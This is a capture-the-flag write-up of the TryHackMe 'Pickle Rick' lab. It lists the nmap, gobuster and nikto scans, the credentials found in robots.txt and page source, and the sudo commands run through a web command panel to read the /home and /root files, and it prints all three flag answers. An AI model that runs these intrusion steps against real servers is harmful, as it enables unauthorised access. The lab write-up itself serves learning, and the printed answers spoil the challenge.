# TryHackMe — Pickle Rick Potion (Writeup)

**Author:** Laila  
**Target IP:** 10.10.233.152  
**Date:** 2025-09-30

---

## Summary
This challenge required exploiting a web server to find three secret ingredients for Rick’s potion. Below I document the exact steps I took (copied verbatim from my notes) to enumerate the web application, authenticate, and retrieve all three ingredients.

---

## Steps I ran (exact sequence)

1. `nmap -sV -sC 10.10.233.152`

2.  

gobuster dir -u http://10.10.233.152/
 -w /root/Desktop/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt


3. I opened the assets page, then opened `robots.txt`:


http://10.10.233.152/robots.txt

I got this:


Wubbalubbadubdub

I kept it because it could be the password.

4. I ran Nikto:


nikto -h 10.10.233.152

Nikto showed there is a `login.php` page, so I opened it:


http://10.10.233.152/login.php


5. I logged in to `login.php` using the credentials I had found:


username: R1ckRul3s
password: Wubbalubbadubdub

(The username was discovered earlier in the page source.)

6. After logging in I was taken to:


http://10.10.233.152/portal.php

In the portal command panel I ran `ls` and saw:


Sup3rS3cretPickl3Ingred.txt
assets
clue.txt
denied.php
index.html
login.php
portal.php
robots.txt


7. I downloaded/took `Sup3rS3cretPickl3Ingred.txt` and opened it:


sudo less Sup3rS3cretPickl3Ingred.txt

Inside I found the first ingredient:


mr. meeseek hair


8. Next, in the portal command panel I ran:


sudo ls /home

and got:


rick
ubuntu


9. I listed `/home/rick`:


sudo ls /home/rick

and saw:


second ingredients


10. I opened that file (note the space in the filename):


sudo less /home/rick/"second ingredients"

Inside I found the second ingredient:


1 jerry tear


11. I checked sudo permissions:


sudo -l

This output showed:


Matching Defaults entries for www-data on ip-10.10.233-152:
env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User www-data may run the following commands on ip-10.10.233-152:
(ALL) NOPASSWD: ALL


12. Because of that, I inspected root:


sudo ls -la /root

This showed:


total 36
drwx------ 4 root root 4096 Jul 11 2024 .
drwxr-xr-x 23 root root 4096 Sep 30 18:18 ..
-rw------- 1 root root 168 Jul 11 2024 .bash_history
-rw-r--r-- 1 root root 3106 Oct 22 2015 .bashrc
-rw-r--r-- 1 root root 161 Jan 2 2024 .profile
drwx------ 2 root root 4096 Feb 10 2019 .ssh
-rw------- 1 root root 702 Jul 11 2024 .viminfo
-rw-r--r-- 1 root root 29 Feb 10 2019 3rd.txt
drwxr-xr-x 4 root root 4096 Jul 11 2024 snap


13. I opened the final file:


sudo less /root/3rd.txt

It contained the third ingredient:


3rd ingredients: fleeb juice


---

## Recovered ingredients (final)
1. `mr. meeseek hair`  
2. `1 jerry tear`  
3. `fleeb juice`

---

## Artifacts I collected
- `logged_in.html` (session page after login)  
- `portal.html` (portal page saved)  
- `Sup3rS3cretPickl3Ingred.txt` (contains `mr. meeseek hair`)  
- `/home/rick/second ingredients` (contains `1 jerry tear`)  
- `/root/3rd.txt` (contains `3rd ingredients: fleeb juice`)  
- screenshots of portal output / sudo evidence (optional)

---

## Notes
- The above steps are an exact record of what I ran and what I observed. I did not add or alter the steps — this is a verbatim walkthrough for reproducibility.
- All activity was performed in a controlled TryHackMe environment.

---
